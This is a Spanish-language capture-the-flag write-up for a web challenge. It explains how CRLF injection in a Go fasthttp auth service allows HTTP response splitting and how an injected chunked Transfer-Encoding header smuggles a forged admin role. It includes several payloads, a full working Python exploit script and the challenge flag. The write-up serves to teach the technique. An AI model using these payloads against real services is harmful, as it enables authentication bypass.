# Login Libre - CTF Writeup

## Información del Reto

- **Nombre:** Login Libre
- **URL:** login-libre.blackalpaca.org:3000
- **Categoría:** Web
- **Descripción:** "Intenta iniciar sesión, explotar SQLi en 2025?) nao nao nao"
- **Flag:** `ALP{w3_can_be_anything_7c0f5mce}`

## Reconocimiento Inicial

### 1. Análisis de la Estructura del Código

El reto proporciona el código fuente de la aplicación, que consiste en dos servicios Go:

```
freely-login/
├── auth/          # Servicio de autenticación (fasthttp)
│   ├── main.go
│   ├── go.mod
│   └── Dockerfile
├── web/           # Servicio web frontend (net/http)
│   ├── main.go
│   └── Dockerfile
└── compose.yaml
```

### 2. Revisión del Código Fuente

#### Servicio Auth (`auth/main.go`)

```go
func loginHandler(ctx *fasthttp.RequestCtx) {
    var username, password string

    username = string(ctx.FormValue("username"))
    password = string(ctx.FormValue("password"))

    ctx.Response.Header.Set("Content-Type", "application/json")
    ctx.Response.Header.Add("X-Username", username)      // ⚠️ Sin validación
    ctx.Response.Header.Add("X-Password", password)      // ⚠️ Sin validación

    response := AuthResponse{
        Username: username,
    }
    json.NewEncoder(ctx).Encode(response)  // Solo devuelve {"username":"..."}
}
```

**Observaciones clave:**
- No hay validación de input en `username` y `password`
- Los valores se agregan directamente a los headers HTTP
- El JSON de respuesta solo incluye el campo `username`, **no incluye `role`**

#### Servicio Web (`web/main.go`)

```go
type AuthResponse struct {
    Username string `json:"username"`
    Role     string `json:"role,"`    // ⚠️ Coma sospechosa al final
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
    // ... código que envía request al servicio auth ...

    respBody, err := io.ReadAll(resp.Body)
    var authResp AuthResponse
    if err := json.Unmarshal(respBody, &authResp); err != nil {
        showLoginForm(w, "")
        return
    }

    if authResp.Role == "admin" {  // ⚠️ Verificación crítica
        authResp.Username += ", bota tu gaaa, y tu flag:" + FLAG
    }

    showLoginForm(w, authResp.Username)
}
```

**Observaciones clave:**
- Para obtener la flag, necesitamos que `authResp.Role == "admin"`
- El servicio auth **nunca** devuelve el campo `role` en su JSON
- Necesitamos encontrar una forma de inyectar el campo `role` en la respuesta

### 3. Identificación de la Pista Clave

Al revisar `auth/go.mod`:

```go
module crlf-server  // ⚠️ ¡Nombre del módulo muy revelador!

go 1.24.4

require github.com/valyala/fasthttp v1.68.0
```

El nombre del módulo es **`crlf-server`**, lo que indica fuertemente que la vulnerabilidad es **CRLF Injection**.

## Desarrollo del Exploit

### Intento 1: JSON Injection (Fallido)

**Hipótesis:** Inyectar el campo `role` directamente en el username.

```python
payload = 'test","role":"admin'
# Esperado: {"username":"test","role":"admin"}
```

**Resultado:** ❌ Fallido

**Razón:** El encoder JSON de Go escapa automáticamente las comillas:
```json
{"username":"test\",\"role\":\"admin"}
```

### Intento 2: CRLF Injection Básico (Fallido)

**Hipótesis:** Usar `\r\n\r\n` para cerrar los headers HTTP e inyectar un body personalizado.

```python
payload = 'test\r\n\r\n{"username":"admin","role":"admin"}'
```

**Resultado:** ❌ Error de JSON parsing en el servicio web

**Análisis:** El CRLF está afectando la respuesta HTTP, pero el JSON resultante no es válido. Esto indica que:
1. El CRLF injection **SÍ está funcionando**
2. Pero el body resultante está corrupto o incompleto

### Intento 3: Manipulación de Content-Length (Fallido)

**Hipótesis:** Inyectar un header `Content-Length` falso para controlar cuántos bytes lee el cliente.

```python
payload = 'x\r\nContent-Length: 38\r\n\r\n{"username":"admin","role":"admin"}'
```

**Resultado:** ❌ Error de JSON parsing

### Intento 4: Transfer-Encoding Chunked (EXITOSO ✓)

**Hipótesis:** Usar `Transfer-Encoding: chunked` para controlar cómo se envía el body HTTP.

#### ¿Qué es Transfer-Encoding: chunked?

HTTP permite enviar el body en "chunks" (trozos) en lugar de especificar el tamaño total con `Content-Length`. Cada chunk tiene este formato:

```
<tamaño_en_hex>\r\n
<datos>\r\n
```

Y termina con un chunk de tamaño 0:

```
0\r\n
\r\n
```

#### El Payload Ganador

```python
target_json = '{"username":"admin","role":"admin"}'
hex_length = hex(len(target_json))[2:]  # 38 en decimal = 26 en hex

payload = f'x\r\nTransfer-Encoding: chunked\r\n\r\n26\r\n{target_json}\r\n0\r\n\r\n'
```

#### ¿Por qué funciona?

Cuando el servicio auth procesa este payload, la respuesta HTTP se ve así:

```http
HTTP/1.1 200 OK
Content-Type: application/json
X-Username: x
Transfer-Encoding: chunked    ← Nuestro header inyectado

26                              ← Tamaño del chunk en hex (38 bytes)
{"username":"admin","role":"admin"}  ← Nuestro JSON inyectado
0                               ← Chunk final de tamaño 0

X-Password: test                ← Esto viene después pero ya no importa
```

El cliente HTTP del servicio web (Go's `net/http`) interpreta la respuesta como chunked encoding y lee **solo** nuestro JSON inyectado, ignorando el resto.

#### Explicación Técnica Detallada

1. **Inyección del header:** El CRLF en el username permite inyectar el header `Transfer-Encoding: chunked`

2. **Cierre de headers:** El doble CRLF (`\r\n\r\n`) indica el fin de los headers HTTP

3. **Body chunked:** El formato chunked permite enviar datos en múltiples fragmentos:
   - `26\r\n` indica que el siguiente chunk tiene 0x26 (38) bytes
   - Nuestro JSON de 38 bytes
   - `0\r\n\r\n` indica el fin del chunked encoding

4. **Parsing del cliente:** El cliente HTTP de Go lee solo el contenido de los chunks, obteniendo nuestro JSON completo con `"role":"admin"`

5. **Verificación exitosa:** El servicio web parsea el JSON y `authResp.Role == "admin"` es verdadero, mostrando la flag

## Script de Exploit Final

```python
#!/usr/bin/env python3
"""
Login Libre CTF - Exploit
==========================

Vulnerabilidad: HTTP Response Splitting via CRLF Injection + Transfer-Encoding Chunked
Target: login-libre.blackalpaca.org:3000

Técnica:
--------
1. Inyectar CRLF en el campo username para manipular los headers HTTP
2. Usar Transfer-Encoding: chunked para controlar el body de la respuesta
3. Inyectar un JSON con "role":"admin" para pasar la verificación
4. Obtener la flag

Author: p0mb3r0
"""

import requests
import json
import re

def exploit(target_url):
    """
    Explota la vulnerabilidad CRLF Injection en el servicio auth
    """
    print("[+] Login Libre CTF - Exploit")
    print(f"[+] Target: {target_url}")
    print()

    # JSON que queremos que el servicio web reciba
    target_json = {
        "username": "admin",
        "role": "admin"  # Este campo es crítico para obtener la flag
    }
    target_json_str = json.dumps(target_json)

    # Calcular el tamaño en hexadecimal para el chunked encoding
    chunk_size_hex = hex(len(target_json_str))[2:]  # 38 bytes = 0x26 en hex

    print(f"[+] Target JSON: {target_json_str}")
    print(f"[+] Chunk size: {len(target_json_str)} bytes (0x{chunk_size_hex} hex)")
    print()

    # Construir el payload CRLF injection con Transfer-Encoding chunked
    #
    # Estructura del payload:
    # - "x" → valor inicial del header X-Username
    # - "\r\n" → CRLF para cerrar el header actual
    # - "Transfer-Encoding: chunked\r\n" → Inyectar nuevo header
    # - "\r\n" → CRLF doble para cerrar todos los headers
    # - "26\r\n" → Tamaño del chunk en hex
    # - JSON → Nuestro contenido
    # - "\r\n0\r\n\r\n" → Chunk final de tamaño 0 (fin de chunked encoding)

    payload = (
        f"x\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{chunk_size_hex}\r\n"
        f"{target_json_str}\r\n"
        f"0\r\n"
        f"\r\n"
    )

    print(f"[+] Payload length: {len(payload)} bytes")
    print(f"[+] Payload (escaped): {repr(payload[:60])}...")
    print()

    # Enviar el payload
    data = {
        "id": payload,  # Campo username
        "pw": "test"    # Campo password (no importa el valor)
    }

    print("[+] Enviando exploit...")

    try:
        response = requests.post(target_url, data=data, timeout=10)

        print(f"[+] Status code: {response.status_code}")
        print(f"[+] Response length: {len(response.text)} bytes")
        print()

        # Verificar si obtuvimos la flag
        if "bota tu gaaa" in response.text:
            print("[✓] ¡Exploit exitoso! Flag encontrada")
            print()

            # Extraer todas las flags (la real y la fake)
            all_flags = re.findall(r'ALP\{[^}]+\}', response.text)

            for flag in all_flags:
                if "f4k3" in flag:
                    print(f"[*] Flag fake (del HTML): {flag}")
                else:
                    print(f"[!] FLAG REAL: {flag}")
                    print()

                    # Guardar la flag
                    with open("flag.txt", "w") as f:
                        f.write(flag)
                    print(f"[+] Flag guardada en flag.txt")

                    return flag
        else:
            print("[✗] Exploit falló - no se encontró 'bota tu gaaa'")

            # Mostrar el mensaje de bienvenida para debugging
            welcome = re.search(r'Welcome: ([^<]+)</div>', response.text)
            if welcome:
                print(f"[*] Welcome message: {welcome.group(1)[:100]}")
            else:
                print("[*] No hay welcome message (JSON parsing error)")

    except Exception as e:
        print(f"[✗] Error: {e}")
        return None

    return None


if __name__ == "__main__":
    # URL del reto
    TARGET = "http://login-libre.blackalpaca.org:3000/login"

    # Ejecutar exploit
    flag = exploit(TARGET)

    if flag:
        print()
        print("="*70)
        print(f" FLAG: {flag}")
        print("="*70)
    else:
        print()
        print("[!] No se pudo obtener la flag")

```

### 2. Transfer-Encoding vs Content-Length

Cuando ambos headers están presentes, HTTP/1.1 especifica que `Transfer-Encoding` tiene precedencia. Esto permitió sobrescribir el comportamiento esperado.

### 3. Pistas Engañosas

- El título mencionaba "SQLi en 2025?" pero no había SQL
- "nao nao nao" (no no no) era una pista de que NO era SQL injection
- El nombre del módulo `crlf-server` era la pista real

## Conclusión

Este reto demuestra una vulnerabilidad de **HTTP Response Splitting** mediante CRLF injection en fasthttp, explotada usando `Transfer-Encoding: chunked` para inyectar un JSON controlado en la respuesta HTTP.

**Flag:** `ALP{w3_can_be_anything_7c0f5mce}`

---

**Autor:** p0mb3r0
**Fecha:** 2025-11-21
